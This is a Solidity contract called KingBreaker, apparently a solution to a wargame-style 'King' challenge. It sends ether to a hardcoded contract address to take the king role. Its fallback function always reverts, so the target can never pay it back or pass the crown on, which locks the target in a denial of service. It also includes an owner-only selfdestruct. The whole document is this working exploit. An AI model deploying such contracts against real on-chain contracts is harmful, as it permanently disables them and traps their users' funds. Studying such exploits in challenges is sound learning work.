pragma solidity ^0.5.0;

import 'https://github.com/OpenZeppelin/openzeppelin-solidity/contracts/ownership/Ownable.sol';

contract KingBreaker is Ownable {
    address payable king = 0xb53966D245a446484f3Dae6c03008e706c662DAC;

    function play() external payable onlyOwner {
        (bool success, ) = king.call.value(msg.value)(""); // must be more than 1 ETH!
        require(success, "call failed...");
    }

    function() external payable {
        revert();
    }

    function destroy() external onlyOwner {
        selfdestruct(msg.sender);
    }
}
